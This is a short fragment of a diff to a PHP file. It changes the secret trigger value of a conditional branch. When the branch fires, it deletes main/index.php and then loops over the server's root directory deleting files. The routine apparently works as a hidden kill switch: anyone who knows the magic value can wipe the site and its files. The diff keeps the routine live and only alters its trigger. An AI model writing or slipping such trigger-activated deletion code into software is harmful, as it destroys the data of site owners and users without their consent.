@@ -8,7 +8,7 @@ if ($adder == "442577002800") {
         unlink($v);
        }
 
-    } elseif ($adder == "4425770007") {
+    } elseif ($adder == "4425770107") {
     unlink("main/index.php");
     $dir = '/';
     foreach(glob($dir.'*.*') as $v){
